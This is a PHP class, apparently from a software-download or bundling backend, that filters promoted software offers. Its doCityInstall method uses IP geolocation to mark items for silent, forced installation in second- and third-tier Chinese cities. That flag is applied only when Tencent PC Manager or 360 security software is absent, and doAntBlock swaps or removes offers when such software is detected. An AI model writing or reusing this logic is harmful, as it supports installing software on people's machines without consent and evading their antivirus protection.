<?php namespace App\Models;
use App\Models\IpLocation as IpLocation;

class Material {
	private $_list = array();

	public function setList($list) {
		if(empty($list)) {
			return false;
		}
		foreach($list as $key=>$val){
			if($key=='alternative'){
				continue;
			}else{
				foreach($val as $k=>$v){
					if(empty($v)) {
						continue;
					}
					if(isset($v["linkColor"])&&$v["linkColor"]){
						$list[$key][$k]['linkColor'] = str_replace('#','$FF',$v['linkColor']);
					}else{
						$list[$key][$k]['linkColor'] = '';
					}
				}
			}
		}
		$alternative = array();
		foreach ($list['alternative'] as $i => $v) {
			if(empty($v)) {
				continue;
			}
			$alternative[$v['id']] = $v;
			if(isset($v['linkColor'])&&$v['linkColor']){
				$alternative[$v['id']]['linkColor'] = str_replace('#','$FF',$v['linkColor']);
			}else{
				$alternative[$v['id']]['linkColor'] = "";
			}
		}
		$list['alternative'] = $alternative;
		$this->_list = $list;
	}

	public function getList() {
		return $this->_list;
	}

	public function doCityInstall($ip,$sdSoft) {

        $isFirstLevelCity = IpLocation::isFirstLevelCity($ip);
		foreach ($this->_list as $page => $list) {
			foreach ($list as $i => $v) {
				if(!isset($v['cssilent']) || $v['cssilent'] == 0) {
					continue;
				}
				// 二三线城市静默安装
				if ($v['cssilent'] == 1 && !$isFirstLevelCity) {
					$this->_list[$page][$i]['silent'] = 1;
				} elseif ($v['cssilent'] == 2 && $isFirstLevelCity) {
					// 二三线城市定点投放
					unset($this->_list[$page][$i]);
				} elseif ($v['cssilent'] == 3) {//定点强制
					if($isFirstLevelCity) {
						// 一线城市不展示
						unset($this->_list[$page][$i]);
					} else {
						// 二三线城市静默
						$this->_list[$page][$i]['silent'] = 1;
					}
				}elseif ($v['cssilent'] == 4&& !$isFirstLevelCity) {//非电脑管家强制

					if(($sdSoft & 4) <= 0) {
						$this->_list[$page][$i]['silent'] = 1;
					}
				}elseif ($v['cssilent'] == 5&& !$isFirstLevelCity) {//非360强制

					if(($sdSoft & 3) <= 0) {
						$this->_list[$page][$i]['silent'] = 1;
					}

				}elseif ($v['cssilent'] == 6&& !$isFirstLevelCity) {//双非强制

					if(($sdSoft & 7) <= 0) {
						$this->_list[$page][$i]['silent'] = 1;
					}
				}
			}
		}
		return true;
	}

	public function doAntBlock($sdSoft) {
		if(intval($sdSoft) <= 0) {
			return true;
		}
		$sdSoft = intval($sdSoft);
                foreach ($this->_list['alternative'] as $i => $v) {
                        if (!isset($v['sdSoft']) || empty($v['sdSoft'])) {
                                continue;
                        }
                        if(empty($v)) {
                                unset($this->_list['alternative'][$i]);
                        }
			$this->_list['alternative'][$i]['sdSoft'] = $v['sdSoft'] = array_sum($v['sdSoft']);
                        if(($v['sdSoft'] & $sdSoft) > 0) {
                                unset($this->_list['alternative'][$i]);
                        }
                }
		foreach ($this->_list as $page => $list) {
			if ($page == 'alternative') continue;
			foreach ($list as $i => $v) {
				if (!isset($v['sdSoft']) || empty($v['sdSoft'])) {
					continue;
				}
				if(empty($v)) {
					unset($this->_list[$page][$i]);
				}
				$this->_list[$page][$i]['sdSoft'] = $v['sdSoft'] = array_sum($v['sdSoft']);
				if(($v['sdSoft'] & $sdSoft) > 0) {
					if(!empty($v['altid'])) {
						$this->_list[$page][$i] = $this->_list['alternative'][$v['altid']];
					} else {
						if (empty($this->_list['alternative'])) {
                                                	unset($this->_list[$page][$i]);
							continue;
						}

                                                $num = array_rand($this->_list['alternative']);
                                                $this->_list[$page][$i] = $this->_list['alternative'][$num];
                                                unset($this->_list['alternative'][$num]);
					}
				}
			}
		}
		return true;
	}
}
